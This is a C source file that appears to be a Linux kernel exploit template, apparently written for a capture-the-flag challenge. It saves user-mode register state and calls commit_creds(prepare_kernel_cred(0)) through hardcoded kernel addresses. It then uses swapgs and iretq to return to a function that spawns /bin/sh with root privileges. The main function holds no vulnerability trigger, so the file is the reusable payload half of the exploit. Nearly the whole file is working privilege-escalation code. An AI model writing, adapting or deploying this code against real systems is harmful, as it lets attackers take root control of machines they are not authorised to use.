#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>

uintptr_t user_cs, user_ss, user_rsp, user_rflags;

uintptr_t prepare_kernel_cred;
uintptr_t commit_creds;
uintptr_t init_cred;

static void win(void) {
    char* argv[] = {"/bin/sh", NULL};
    char* envp[] = {NULL};
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void save_state(void) {
    asm("movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

static void restore_state(void) {
    asm volatile(
        "swapgs ;"
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs),
          "r"(win));
}

static void escalate_privilege(void) {
    char* (*pkc)(int) = (void*)(prepare_kernel_cred);
    void (*cc)(char*) = (void*)(commit_creds);
    (*cc)((*pkc)(0));
    restore_state();
}

static void init_exploit(void) {
    prepare_kernel_cred = 0xffffffff8106e240;
    commit_creds = 0xffffffff8106e390;
    init_cred = 0x0;
    save_state();
}

// ---------------------------------------------------------------------------------

#define BUFFER_SIZE 0x400

int main(void) {
    init_exploit();



    return 0;
}
